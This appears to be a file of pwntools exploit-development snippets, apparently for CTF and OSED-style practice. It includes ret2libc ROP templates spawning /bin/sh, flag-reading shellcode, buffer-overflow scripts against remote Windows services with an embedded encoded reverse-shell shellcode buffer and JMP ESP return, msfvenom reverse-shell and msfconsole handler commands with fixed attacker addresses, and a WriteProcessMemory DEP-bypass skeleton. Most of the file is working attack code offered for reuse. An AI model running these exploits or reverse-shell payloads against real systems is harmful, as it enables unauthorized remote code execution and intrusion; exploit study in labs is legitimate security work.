snippet importsml
 import numpy as np
 import pandas as pd
 import matplotlib.pyplot as plt
 import seaborn as sns
 import tensorflow as tf

snippet importscrypto
 from Crypto.Util.number import bytes_to_long, long_to_bytes
 import base64
 import codecs
 import random


snippet pwn_solve_regex
 from pwn import *
 import re
 import sys
 context.log_level = 'debug'
 HOST = "0"
 PORT = 9007
 session = remote(HOST, PORT)
  
  session.recvuntil(b"Ready?")
  pattern_q = rb"""N=(\d+) C=(\d+)"""
  pattern_a = rb"(\d+)"
  while True:
      question_d = session.recvline_regex(pattern_q)
      question = re.search(pattern_q, question_d)
      n, c = question.groups()
      n, c = int(n), int(c)
      print(n, c)
      l, r = 0, n
      for _ in range(c+1):
  
          mid = (l+r)//2
          numbers = b" ".join([str(i).encode() for i in range(l, mid+1)])
          session.send(numbers + b"\n")
  
          ans_d = session.recvline()
          ans = re.search(pattern_a, ans_d)
          x = ans.groups()[0]
          x = int(x.decode())
  
          if(x % 10 == 0):
              l = mid +1
          else:
              r = mid
  session.interactive()
 sys.exit(0)




snippet pwn_exploit
 #!/usr/bin/env python3
  # pwn_snippets.py
  # Two reusable pwntools snippets: `pwn_solve` (template) and `pwn_exploit` (practical exploit helpers)
  # Usage: copy the function you need into your exploit script and customize.
  
  from pwn import *
  
  # -----------------------------
  # snippet: pwn_solve
  # Minimal, clear scaffold to solve typical pwntable challenges (local/remote/gdb)
  # Customize: BINARY, LIBC (optional), REMOTE_HOST/PORT
  # -----------------------------
  
  def pwn_solve(BINARY, LIBC=None, remote_addr=None, gdb_script=None):
      # Setup
      context.binary = ELF(BINARY)
      elf = context.binary
      if LIBC:
          libc = ELF(LIBC)
      else:
          libc = None
  
      def start():
          if remote_addr:
              host, port = remote_addr
              return remote(host, port)
          if gdb_script:
              return gdb.debug([BINARY], gdb_script)
          return process([BINARY])
  
      io = start()
  
      # Helpers
      def ru(delim): return io.recvuntil(delim)
      def rl(): return io.recvline()
      def sla(a, b): return io.sendlineafter(a, b)
      def sa(a, b): return io.sendafter(a, b)
      def leak(addr):
          # generic leak helper (send format-string / read memory as needed)
          return u64(io.recvn(8).ljust(8, b"\x00"))
  
      # Example flow (adjust to target):
      # 1) leak puts@GOT to get libc base
      puts_plt = elf.plt.get('puts') if 'puts' in elf.plt else None
      puts_got = elf.got.get('puts') if 'puts' in elf.got else None
  
      # Example: build ROP to leak puts
      rop = ROP(elf)
      rop.puts(puts_got)
      rop.main()  # return to main for a second stage
  
      payload = flat({
          0: b'A'*cyclic_find(0x6161616b) if False else b'A'*40,  # replace offset
          40: rop.chain()
      })
  
      io.sendline(payload)
      leaked = io.recvline(timeout=2)
      # parse leaked address (depends on binary)
      try:
          leaked_puts = u64(leaked.strip().ljust(8, b"\x00"))
      except Exception:
          leaked_puts = None
  
      if libc and leaked_puts:
          libc_base = leaked_puts - libc.symbols['puts']
          log.success(f"libc base: {hex(libc_base)}")
          system = libc_base + libc.symbols['system']
          binsh = libc_base + next(libc.search(b"/bin/sh"))
          # second stage: call system('/bin/sh')
          rop2 = ROP(elf)
          rop2.raw(p64(system))
          rop2.raw(p64(binsh))
          payload2 = b'B'*40 + rop2.chain()
          io.sendline(payload2)
          io.interactive()
      else:
          # fallback: interactive to allow manual steps
          io.interactive()
  
  
  # -----------------------------
  # snippet: pwn_exploit
  # Helper functions + example showing format string, heap or ret2libc patterns.
  # -----------------------------
  
  class Exploit:
      def __init__(self, binary, libc_path=None, remote_addr=None, gdb_script=None):
          context.binary = ELF(binary)
          self.elf = context.binary
          self.libc = ELF(libc_path) if libc_path else None
          self.remote_addr = remote_addr
          self.gdb_script = gdb_script
  
      def start(self):
          if self.remote_addr:
              return remote(*self.remote_addr)
          if self.gdb_script:
              return gdb.debug([self.elf.path], self.gdb_script)
          return process([self.elf.path])
  
      @staticmethod
      def p64(n): return p64(n)
      @staticmethod
      def u64(d): return u64(d.ljust(8, b"\x00"))
  
      def leak_via_puts(self, io, what):
          # Build ROP to call puts(what) then return to main
          rop = ROP(self.elf)
          rop.puts(what)
          rop.main()
          padding = b'A' * 40  # adjust offset
          payload = padding + rop.chain()
          io.sendline(payload)
          leaked = io.recvline(timeout=2)
          return self.u64(leaked.strip())
  
  
  # Example usage (uncomment and edit):
  # if __name__ == '__main__':
  #     # Simple ret2libc flow
  #     pwn_solve('./vuln', LIBC='./libc.so.6', remote_addr=None, gdb_script=None)
  
  # End of pwn_snippets.py


snippet pwn_bash
 python3 - <<'PY'
 from pwn import *
 context.log_level = 'debug'
 session = process('./lotto')
 while True:
     session.recvuntil(b'3. Exit')
     session.sendline(b'1')
     session.sendline(b'\x01'*6) 
     session.recvuntil(b'bad luck')
 PY


snippet pwn_shellcode
 from pwn import *
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
     if args.GDB:  # Set GDBscript below
         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
     elif args.REMOTE:  # ('server', 'port')
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
 
 def logbase(): log.info("libc base = %#x" % libc.address)
 def logleak(name, val):  log.info(name+" = %#x" % val)
 def sa(delim,data): return io.sendafter(delim,data)
 def sla(delim,line): return io.sendlineafter(delim,line)
 def sl(line): return io.sendline(line)
 
 
 
 def one_gadget(filename, base_addr=0):
   return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
 
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
 b *main+330
 continue
 '''.format(**locals())
 
 context.terminal = ['tmux','splitw','-h']
 # Binary filename
 exe = './a'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
 context.log_level = 'debug'
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
 # ===========================================================
 
 # Lib-C library, can use pwninit/patchelf to patch binary
 # libc = ELF("./libc.so.6")
 # ld = ELF("./ld-2.27.so")
 
 
 # Start program
 io = start()
 
 # Build the payload
 payload = asm("""
 mov rax, 2
 lea rdi, [rip+flag]
 xor rsi, rsi
 xor rdx, rdx
 syscall
 mov r8, rax
 xor rax, rax
 mov rdi, r8 
 mov rsi, rsp
 mov rdx, 70            
 syscall
 mov r9, rax
 mov rax, 1                
 mov rdi, 1              
 mov rsi, rsp
 mov rdx, r9            
 syscall
 flag: 
               .string "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
 """)
 io.sendline(payload)
 # Got Shell?
 io.interactive()

snippet pwn_reverse_shell
 #!/usr/bin/python
 import socket
 import sys
 import struct
 from pwn import p32
 from pprint import pprint as pp
 
 pattern_length = 0xA00
 print(f"""/opt/metasploit/tools/exploit/pattern_create.rb -l {pattern_length}""")
 print(f"""/opt/metasploit/tools/exploit/pattern_offset.rb -l {pattern_length} -q 33794332 """)
 
 try:
   host = sys.argv[1]
   port = 7001
 
   LHOST="192.168.45.210"
   LPORT=4444
   size = 2288
   payload = b"A" * size
   payload += b"B" * 4 # return_address 
   payload += b"C" * 4 
   payload += b"D" * 4 
   # payload += b"E" * 350
   payload += b"\x90"*20
 
   # the_thread_limit_after_return_address = (0x041b0000 - 0x041af75c)
   # payload += b"D"*(the_thread_limit_after_return_address-10)
 
   bad_chars = {0x00}
   bad_boys = f"\"{"".join(f"\\x{b:02x}" for b in bytes(bad_chars))}\""
   print(f"""msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f python –e x86/shikata_ga_nai -b {bad_boys}""")
   chars = bytes(range(0xff+1))
   check_boys = bytes(b for b in chars if b not in bad_chars) 
   # pp(bad_boys)
   # pp(check_boys)
 
   #print([chr(i) for i in bad_chars])
   # payload += check_boys
 
   # buf = chars
   # Shell code here 
 
   # payload += buf 
 
   payload += b"\x90"*10
 
   print("\nSending evil buffer...")
 
   # buffer = b"A" * 0xA00
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   s.connect((host, port))
   s.send(payload)
   s.close()
   
   print("\nDone!")
   
 except:
   print("\nCould not connect!")


snippet pwn_connect_network_stack_overflow
  #!/usr/bin/python
  import socket
  import sys
  import struct
  from pwn import p32
  from pprint import pprint as pp
  
  pattern_length = 0x3fff
  print(f"/opt/metasploit/tools/exploit/pattern_create.rb -l {pattern_length}")
  print(f"/opt/metasploit/tools/exploit/pattern_offset.rb -l {pattern_length} -q 72433372")
  print(f"/opt/metasploit/tools/exploit/metasm_shell.rb")
  
  try:
    host = sys.argv[1]
    port = 7002
  
    # os.system(['tmux','splith','-h'])
  
    LHOST="192.168.45.210"
    LPORT=4444
    size = 2080
  
  
    # payload += b"D" * 4 
    # payload += b"E" * 350
    # payload += b"\x90"*20
  
    # the_thread_limit_after_return_address = (0x041b0000 - 0x041af75c)
    # payload += b"D"*(the_thread_limit_after_return_address-10)
  
    good_chars = { }
    good_boys = {}
    bad_chars  = {0x00, 0x3b, 0x45}
  
  
    good_boys  = f"\"{"".join(f"\\x{b:02x}" for b in bytes(good_chars))}\""
    bad_boys   = f"\"{"".join(f"\\x{b:02x}" for b in bytes(bad_chars))}\""
    
    print(f"""msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f python –e x86/shikata_ga_nai -b {bad_boys}""")
    print(f"""msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f python -b {bad_boys}""")
    print(f"""msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f python -b {bad_boys}""")
  
    chars = bytes(range(0xff+1))
    check_boys = bytes(b for b in chars if (b not in bad_chars and b not in good_chars))
  
    pp(good_boys)
    pp(bad_boys)
    pp(check_boys) 
    # limit = 12 
    # check_boys = check_boys[12]
  
  
    # payload = b"A" * (size-(0xff+0x10))
    # payload += b"F" * 0x10
    # payload += check_boys
    # payload += b"F" * (0xff-len(check_boys))
    # payload += b"B" * 4 # return_address 
    # # payload += b"C" * 0x100
  
    # payload += check_boys
    # buf = chars
    # Shell code here 
  
    jmp_esp_offset = p32(0x1480113d)
    jmp_back = b"\xe9\x13\xfc\xff\xff" #jmp - 1000
    copy_esp2eax = b"\x89\xe0"
    sub_ax_800 = b"\x66\x2d\x20\x03"
    jmp_eax = b"\xff\xe0"
    call_eax = b"\xff\xd0"
    ret_eax = b"\xff\xd0"
    ret = b"\xc3"
  
    
    buf =  b""
    buf += b"\xda\xd2\xd9\x74\x24\xf4\xba\x14\x92\x26\x21\x5e"
    buf += b"\x31\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\x42"
    buf += b"\x81\xc4\xd4\x96\x4d\x8a\x17\x66\x8e\xeb\x9e\x83"
    buf += b"\xbf\x2b\xc4\xc0\x90\x9b\x8e\x84\x1c\x57\xc2\x3c"
    buf += b"\x96\x15\xcb\x33\x1f\x93\x2d\x7a\xa0\x88\x0e\x1d"
    buf += b"\x22\xd3\x42\xfd\x1b\x1c\x97\xfc\x5c\x41\x5a\xac"
    buf += b"\x35\x0d\xc9\x40\x31\x5b\xd2\xeb\x09\x4d\x52\x08"
    buf += b"\xd9\x6c\x73\x9f\x51\x37\x53\x1e\xb5\x43\xda\x38"
    buf += b"\xda\x6e\x94\xb3\x28\x04\x27\x15\x61\xe5\x84\x58"
    buf += b"\x4d\x14\xd4\x9d\x6a\xc7\xa3\xd7\x88\x7a\xb4\x2c"
    buf += b"\xf2\xa0\x31\xb6\x54\x22\xe1\x12\x64\xe7\x74\xd1"
    buf += b"\x6a\x4c\xf2\xbd\x6e\x53\xd7\xb6\x8b\xd8\xd6\x18"
    buf += b"\x1a\x9a\xfc\xbc\x46\x78\x9c\xe5\x22\x2f\xa1\xf5"
    buf += b"\x8c\x90\x07\x7e\x20\xc4\x35\xdd\x2d\x29\x74\xdd"
    buf += b"\xad\x25\x0f\xae\x9f\xea\xbb\x38\xac\x63\x62\xbf"
    buf += b"\xd3\x59\xd2\x2f\x2a\x62\x23\x66\xe9\x36\x73\x10"
    buf += b"\xd8\x36\x18\xe0\xe5\xe2\x8f\xb0\x49\x5d\x70\x60"
    buf += b"\x2a\x0d\x18\x6a\xa5\x72\x38\x95\x6f\x1b\xd3\x6c"
    buf += b"\xf8\xe4\x8c\x43\x2a\x8c\xce\x9b\xdb\x11\x46\x7d"
    buf += b"\xb1\xb9\x0e\xd6\x2e\x23\x0b\xac\xcf\xac\x81\xc9"
    buf += b"\xd0\x27\x26\x2e\x9e\xcf\x43\x3c\x77\x20\x1e\x1e"
    buf += b"\xde\x3f\xb4\x36\xbc\xd2\x53\xc6\xcb\xce\xcb\x91"
    buf += b"\x9c\x21\x02\x77\x31\x1b\xbc\x65\xc8\xfd\x87\x2d"
    buf += b"\x17\x3e\x09\xac\xda\x7a\x2d\xbe\x22\x82\x69\xea"
    buf += b"\xfa\xd5\x27\x44\xbd\x8f\x89\x3e\x17\x63\x40\xd6"
    buf += b"\xee\x4f\x53\xa0\xee\x85\x25\x4c\x5e\x70\x70\x73"
    buf += b"\x6f\x14\x74\x0c\x8d\x84\x7b\xc7\x15\xa4\x99\xcd"
    buf += b"\x63\x4d\x04\x84\xc9\x10\xb7\x73\x0d\x2d\x34\x71"
    buf += b"\xee\xca\x24\xf0\xeb\x97\xe2\xe9\x81\x88\x86\x0d"
    buf += b"\x35\xa8\x82"
    
    # shell_code = b"A" * 400
    shell_code = buf
  
    gap = 400
    payload = b"\x90" * (size - len(shell_code)-gap)
    payload += shell_code
    payload += b"\x90" * gap 
  
  
    # payload += b"B"*4
    payload += jmp_esp_offset
    # payload += copy_esp2eax
    # payload += sub_ax_800
    payload += jmp_back
    # payload += jmp_eax
    # payload += call_eax
  
    # payload += b"C" * 8
    
    # payload += b"B" * 4
    # payload += b"B" * 4 
    if(len(payload) > 2096):
        print("Your payload bigger then the gap...")
        exit(1)
    print("\nSending evil buffer...")
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print(len(payload))
    s.send(payload)
    s.close()
    
    print("\nDone!")
    
  except Exception as e:
    print(e)
    print("\nCould not connect!")

snippet pwn_bad_chars
 from pwn import p32
 from pprint import pprint as pp
 
 LHOST="192.168.45.181"
 LPORT=4444
 pattern_length = 6000
 print(f"/opt/metasploit/tools/exploit/pattern_create.rb -l {pattern_length}")
 print(f"/opt/metasploit/tools/exploit/pattern_offset.rb -l {pattern_length} -q 44336644 ")
 print(f"/opt/metasploit/tools/exploit/metasm_shell.rb")
 
 jmp_back = b"\xe9\x13\xfc\xff\xff" #jmp $- 1000
 copy_esp2eax = b"\x89\xe0"
 sub_ax_800 = b"\x66\x2d\x20\x03"
 jmp_eax = b"\xff\xe0"
 call_eax = b"\xff\xd0"
 ret_eax = b"\xff\xd0"
 ret = b"\xc3"
 
 good_chars = bytes(range(0x0))
 bad_chars  = {0x00}
 
 chars = bytes(range(0xff+1))
 check_boys = bytes(b for b in chars if (b not in bad_chars and b not in good_chars))
 good_boys  = f"\"{"".join(f"\\\\x{b:02x}" for b in bytes(good_chars))}\""
 bad_boys   = f"\"{"".join(f"\\\\x{b:02x}" for b in bytes(bad_chars))}\""
 
 print(f"""msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f python –e x86/shikata_ga_nai -b {bad_boys}""")
 print(f"""msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -f python -b {bad_boys}""")
 print(f"""msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f python -b {bad_boys}""")
 print(f"""msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f python -b {bad_boys} -v shell_code""")
 print(f"""sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; exploit" """)
 
 pp(good_boys)
 pp(bad_boys)
 pp(check_boys) 
 
snippet pwn_OSED_expolit
 #!/usr/bin/python
 import socket
 import sys
 from pwn import *
 
 LHOST="192.168.45.188"
 LPORT=4444
 
 pattern_length = 800
 print(f"""/opt/metasploit/tools/exploit/pattern_create.rb -l {pattern_length}""")
 print(f"""/opt/metasploit/tools/exploit/pattern_offset.rb -l {pattern_length} -q 33794332 """)
 print(f"/opt/metasploit/tools/exploit/metasm_shell.rb")
 print(f"/opt/metasploit/tools/exploit/nasm_shell.rb")
 
 good_chars = bytes(range(0x0))
 bad_chars  = {0x00, 0x0a, 0x0d, 0x25, 0x26, 0x2b, 0x3d}
 chars = bytes(range(0xff+1))
 check_boys = bytes(b for b in chars if (b not in bad_chars and b not in good_chars))
 good_boys  = f"\"{"".join(f"\\x{b:02x}" for b in bytes(good_chars))}\""
 bad_boys   = f"\"{"".join(f"\\x{b:02x}" for b in bytes(bad_chars))}\""
 print(bad_boys)
 print(bytes(bad_chars).hex())
 
 WPMAddr = 0x10168034    # KERNEL32!QueryDosDeviceA IAT so we need to derefrence then 7658b0a0-00024ee0
 wpm  = p32(WPMAddr)     # WriteProcessMemory Address
 wpm += p32(0x1016701b) 	# Shellcode Return Address
 wpm += p32(0xFFFFFFFF)  # pseudo Process handle
 wpm += p32(0x1016701b) 	# Code cave address 
 wpm += p32(0x43434343)  # dummy lpBuffer (Stack address) 
 wpm += p32(0x44444444)  # dummy nSize 0x00000fe5
 wpm += p32(0x1020c040) 	# lpNumberOfBytesWritten
 
 server = sys.argv[1]
 port = 80
 size = 780
 payload = b"A" * (size-len(wpm))
 payload += wpm
 # payload += b"B" * 4
 # payload += check_boys

